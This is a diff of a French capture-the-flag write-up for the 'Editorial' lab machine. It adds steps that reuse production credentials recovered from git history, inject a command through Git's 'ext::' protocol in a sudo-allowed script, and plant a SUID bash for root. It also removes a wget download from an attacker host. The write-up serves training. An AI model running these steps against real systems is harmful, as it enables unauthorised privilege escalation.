@@ -422,8 +422,6 @@ Si aucun vhost distinct n’est identifié, ce fichier confirme l’absence de r
 
 ## Prise pied
 
-## Prise pied
-
 L’énumération web a montré que la page `/upload/` permet de proposer un livre à la plateforme Editorial.
 
 ![Page upload de Editorial avec le champ Cover URL permettant de fournir une URL distante pour la couverture du livre](upload-page.png)
@@ -747,74 +745,47 @@ Tu as maintenant terminé la prise pied : la vulnérabilité SSRF a permis d’a
 
 {{< escalade-intro user="dev" >}}
 
-### Observation avec pspy64
-
-Une autre vérification classique consiste à surveiller les processus exécutés sur la machine afin d’identifier d’éventuelles tâches automatiques lancées par `root`.
-
-Pour cela, tu ouvres une deuxième session SSH et tu utilises l’outil `pspy64`.
-
-Comme expliqué dans la recette {{< recette "privilege-escalation-linux" >}}, l’objectif est de lancer d’abord l’observation des tâches root puis de continuer l’énumération dans une autre session.
-
-Tu télécharges ensuite l’outil dans un répertoire accessible en écriture :
-
-```bash
-cd /dev/shm
-wget http://10.10.x.x:8000/pspy64
-chmod +x pspy64
-./pspy64
-```
-
-L’objectif est notamment de détecter :
-
-- des scripts exécutés automatiquement par `root`
-- des tâches cron personnalisées
-- des commandes exécutées périodiquement
-- des accès à des fichiers sensibles
-- des binaires exécutés avec des chemins relatifs
-
-Tu laisses ensuite `pspy64` tourner en arrière-plan pendant la suite de l’énumération afin d’observer d’éventuelles tâches exécutées automatiquement par `root`.
-
-### Sudo -l
-
-Comme souvent lors d’une phase d’escalade de privilèges Linux, tu commences par vérifier les permissions sudo de l’utilisateur courant :
-
-```
-ssh_user@planning:~$ sudo -l
-[sudo] password for dev: 
-Sorry, user dev may not run sudo on planning.
-```
-
-L’utilisateur `dev` ne possède donc aucun droit sudo exploitable.
-
 ### Exploration du contexte utilisateur
 
 Une fois le flag utilisateur récupéré, tu ne disposes pas encore de privilèges élevés sur la machine.
 
 L’étape suivante consiste donc à explorer le contexte de l’utilisateur `dev` afin d’identifier des fichiers, dépôts, scripts ou configurations pouvant révéler une piste vers un autre utilisateur ou vers `root`.
 
-Dans son répertoire personnel, la présence du dossier `apps` attire l’attention. Le nom est cohérent avec le contexte de la machine : tu viens d’exploiter une application web et une API interne. Il est donc logique de vérifier si ce répertoire contient du code applicatif, des fichiers de configuration ou des traces de développement.
+Dans son répertoire personnel, la présence du dossier `apps` attire l’attention :
 
-#### Découverte du dépôt Git
+```bash
+dev@editorial:~$ ls -la
+```
 
-La présence d’un répertoire `apps` attire l’attention :
+```
+drwxr-x--- 4 dev  dev  4096 May 27 16:20 .
+drwxr-xr-x 4 root root 4096 Jun  5  2024 ..
+drwxrwxr-x 3 dev  dev  4096 Jun  5  2024 apps
+lrwxrwxrwx 1 root root    9 Feb  6  2023 .bash_history -> /dev/null
+-rw-r--r-- 1 dev  dev   220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 dev  dev  3771 Jan  6  2022 .bashrc
+drwx------ 2 dev  dev  4096 Jun  5  2024 .cache
+-rw------- 1 dev  dev    20 May 27 16:20 .lesshst
+-rw-r--r-- 1 dev  dev   807 Jan  6  2022 .profile
+-rw-r----- 1 root dev    33 May 27 09:40 user.txt
+```
 
-Le nom `apps` est intéressant dans le contexte de cette machine : tu viens justement d’exploiter une application web et une API interne. Il est donc logique de vérifier si ce répertoire contient du code applicatif, des fichiers de configuration ou des traces de développement.
+Le nom `apps` est cohérent avec le contexte de la machine : tu viens d’exploiter une application web et une API interne. Il est donc logique de vérifier si ce répertoire contient du code applicatif, des fichiers de configuration ou des traces de développement.
 
 Tu entres dans le répertoire :
 
-```bash
+```
 cd apps
 ```
 
+### Découverte du dépôt Git
+
 Dans le répertoire `apps`, tu remarques la présence d’un dépôt Git :
 
-```bash
-dev@editorial:~/apps$ ls -la
 ```
-
-```text
+dev@editorial:~/apps$ ls -la
 drwxrwxr-x 3 dev dev 4096 Jun  5  2024 .
-drwxr-xr-x 4 dev dev 4096 Jun  5  2024 ..
+drwxr-x--- 4 dev dev 4096 May 27 16:20 ..
 drwxrwxr-x 8 dev dev 4096 Jun  5  2024 .git
 ```
 
@@ -828,11 +799,11 @@ Pour travailler plus confortablement, tu peux cloner le dépôt sur ton Kali plu
 
 L’objectif est d’obtenir une copie locale du dépôt afin de pouvoir utiliser tranquillement les commandes Git depuis Kali, sans modifier les fichiers présents dans le répertoire de l’utilisateur `dev`.
 
-#### Clonage du dépôt apps sur Kali
+### Clonage du dépôt apps sur Kali
 
 Depuis ton Kali, tu peux cloner le dépôt distant en passant par SSH :
 
-```bash
+```
 git clone ssh://dev@editorial.htb/home/dev/apps apps_editorial
 ```
 
@@ -842,7 +813,7 @@ Ce nom ne vient pas de la machine cible. Il sert uniquement à ranger proprement
 
 Après avoir saisi le mot de passe de l’utilisateur `dev`, Git récupère le dépôt :
 
-```bash
+```
 Cloning into 'apps_editorial'...
 dev@editorial.htb's password:
 remote: Enumerating objects: ...
@@ -854,7 +825,7 @@ Resolving deltas: ...
 
 Tu peux ensuite entrer dans la copie locale :
 
-```bash
+```
 cd apps_editorial
 ```
 
@@ -862,27 +833,24 @@ cd apps_editorial
 
 Tu peux vérifier l’état du dépôt :
 
-```bash
+```
 git status
 ```
 
 Puis afficher l’historique des commits :
 
-```bash
+```
 git log --oneline
 ```
 
 Cette méthode est plus confortable : tu disposes d’une copie locale complète, tu peux parcourir l’historique, inspecter les commits et rechercher des chaînes intéressantes sans travailler directement sur la cible.
 
-#### Analyse de l’historique Git
+### Analyse de l’historique Git
 
 Depuis la copie locale du dépôt sur Kali, tu affiches l’historique des commits :
 
-```bash
-git log --oneline
 ```
-
-```text
+git log --oneline
 8ad0f31 (HEAD -> master) fix: bugfix in api port endpoint
 dfef9f2 change: remove debug and update api port
 b73481b change(api): downgrading prod to dev
@@ -902,7 +870,7 @@ Les deux premiers indiquent des modifications autour d’un endpoint et du port 
 
 Le commit le plus intéressant est toutefois :
 
-```text
+```
 b73481b change(api): downgrading prod to dev
 ```
 
@@ -910,17 +878,17 @@ Le message suggère qu’un changement a été effectué entre un environnement 
 
 Dans un dépôt Git, ce type de modification mérite toujours d’être inspecté, car il peut révéler une ancienne valeur remplacée, par exemple un identifiant, un mot de passe, une URL interne ou une configuration sensible.
 
-#### Extraction d’identifiants depuis l’historique Git
+### Extraction d’identifiants depuis l’historique Git
 
 Tu inspectes le commit `b73481b`, repéré dans l’historique :
 
-```bash
+```
 git show b73481b
 ```
 
 Le commit porte le message suivant :
 
-```text
+```
 change(api): downgrading prod to dev
 
 * To use development environment.
@@ -932,7 +900,7 @@ Dans la sortie de `git show`, Git affiche les différences entre l’ancienne ve
 
 La partie importante se trouve dans la fonction liée au message de bienvenue des nouveaux auteurs :
 
-```diff
+```
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
@@ -943,31 +911,193 @@ def api_mail_new_authors():
 
 La ligne supprimée, marquée avec `-`, contient les anciens identifiants de production :
 
-```text
+```
 Username: prod
 Password: 080217_Producti0n_2023!@
 ```
 
 La ligne ajoutée, marquée avec `+`, correspond aux identifiants de développement que tu avais déjà récupérés via l’API interne :
 
-```text
+```
 Username: dev
 Password: dev080217_devAPI!@
 ```
 
 C’est exactement le type d’information que l’on cherche dans un historique Git.
 
-Même si les identifiants `prod` ne sont plus présents dans la version actuelle de l’application, ils restent visibles dans l’ancien commit. Le commit a bien remplacé les identifiants de production par des identifiants de développement, mais il n’a pas effacé l’information sensible de l’historique.
+Même si les identifiants `prod` ne sont plus présents dans la version actuelle de l’application, ils restent visibles dans un ancien commit. Le commit a bien remplacé les identifiants de production par des identifiants de développement, mais il n’a pas effacé l’information sensible de l’historique.
 
 Le commentaire situé à la fin du bloc est également intéressant :
 
-```python
+```
 # TODO: replace dev credentials when checks pass
 ```
 
 Il indique que les identifiants de développement étaient censés être temporaires. Cela renforce l’idée que les anciens identifiants `prod` peuvent encore être valides sur la machine.
 
 La prochaine étape consiste donc à tester ces identifiants pour effectuer un mouvement latéral vers l’utilisateur `prod`.
+
+### Mouvement latéral vers l’utilisateur prod
+
+Tu testes les identifiants récupérés dans l’historique Git avec SSH :
+
+```
+ssh prod@editorial.htb
+```
+
+Avec le mot de passe trouvé dans l’ancien commit, la connexion réussit :
+
+```
+prod@editorial.htb's password:
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-107-generic x86_64)
+```
+
+Tu vérifies ensuite l’identité de l’utilisateur courant :
+
+```
+prod@editorial:~$ id
+uid=1000(prod) gid=1000(prod) groups=1000(prod)
+```
+
+Tu as maintenant effectué un mouvement latéral de `dev` vers `prod`.
+
+Ce changement d’utilisateur est important : l’utilisateur `dev` a permis d’obtenir le premier accès SSH et de lire `user.txt`, mais l’historique Git a révélé un second compte local, `prod`, qui dispose potentiellement de permissions différentes.
+
+### Vérification des droits sudo
+
+Une fois connecté en tant que `prod`, tu vérifies ses droits sudo :
+
+```
+sudo -l
+```
+
+Le résultat montre que `prod` peut exécuter un script Python avec les privilèges `root` :
+
+```
+User prod may run the following commands on editorial:
+    (root) NOPASSWD: /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
+```
+
+Cette règle sudo est intéressante pour deux raisons :
+
+- l’utilisateur `prod` peut exécuter le script sans mot de passe ;
+- le script accepte un argument fourni par l’utilisateur.
+
+Tu affiches ensuite le contenu du script pour comprendre son fonctionnement :
+
+```
+cat /opt/internal_apps/clone_changes/clone_prod_change.py
+```
+
+Le script utilise GitPython pour cloner un dépôt depuis une URL fournie en argument :
+
+```
+#!/usr/bin/python3
+
+import sys
+from git import Repo
+
+url_to_clone = sys.argv[1]
+
+r = Repo.init('', bare=True)
+r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
+```
+
+Le point sensible se trouve dans l’appel à `clone_from()`.
+
+Le script autorise explicitement le protocole externe de Git avec l’option suivante :
+
+```
+-c protocol.ext.allow=always
+```
+
+Cette option permet d’utiliser une URL de type `ext::`.
+
+Or, avec Git, le pseudo-protocole `ext::` peut exécuter une commande locale pour établir le transport Git. Comme le script est lancé avec `sudo`, cette commande est exécutée dans le contexte du script, donc avec les privilèges `root`.
+
+L’objectif est donc de fournir au script une URL Git spéciale qui déclenche l’exécution d’une commande contrôlée.
+
+### Création d’un Bash SUID
+
+Pour exploiter cette configuration, tu prépares d’abord un petit script dans `/tmp`.
+
+Ce script copie `/bin/bash` vers `/tmp/rootbash`, puis ajoute le bit SUID sur cette copie :
+
+```
+cat > /tmp/pwn.sh << 'EOF'
+#!/bin/sh
+cp /bin/bash /tmp/rootbash
+chmod 4755 /tmp/rootbash
+EOF
+```
+
+Tu rends ensuite le script exécutable :
+
+```
+chmod +x /tmp/pwn.sh
+```
+
+Le principe est simple :
+
+- `/bin/bash` est copié vers `/tmp/rootbash` ;
+- `chmod 4755` ajoute le bit SUID ;
+- comme l’opération est déclenchée via le script sudo, le fichier `/tmp/rootbash` appartient à `root` ;
+- lorsque tu l’exécutes ensuite avec l’option `-p`, Bash conserve les privilèges effectifs de `root`.
+
+Tu lances maintenant le script sudo avec une URL `ext::` qui appelle ton script `/tmp/pwn.sh` :
+
+```
+sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh /tmp/pwn.sh'
+```
+
+Même si le clonage Git échoue ensuite, ce n’est pas le plus important.
+
+Ce qui compte, c’est que la commande passée à `ext::` a été exécutée avant l’erreur Git. La copie SUID de Bash est donc créée dans `/tmp`.
+
+Tu peux vérifier sa présence :
+
+```
+ls -la /tmp/rootbash
+-rwsr-xr-x 1 root root 1396520 May 27 17:42 /tmp/rootbash
+```
+
+Le `s` dans les permissions confirme que le bit SUID est présent :
+
+```
+-rwsr-xr-x
+```
+
+### Obtention d’un shell root
+
+Il ne reste plus qu’à exécuter cette copie de Bash avec l’option `-p` :
+
+```
+/tmp/rootbash -p
+```
+
+L’option `-p` est importante : elle indique à Bash de conserver les privilèges effectifs hérités du binaire SUID.
+
+Sans cette option, Bash peut abandonner les privilèges élevés par mesure de sécurité.
+
+Tu vérifies ensuite ton identité :
+
+```
+rootbash-5.1# id
+uid=1000(prod) gid=1000(prod) euid=0(root) groups=1000(prod)
+```
+
+L’identifiant utilisateur réel reste `prod`, mais l’identifiant effectif est maintenant `root`.
+
+### root.txt
+
+Tu peux donc lire le flag final :
+
+```
+rootbash-5.1# cat /root/root.txt
+2ffcxxxxxxxxxxxxxxxxxxxxxxxx1638
+```
+
+L’escalade de privilèges est terminée.
 
 ## Conclusion
 
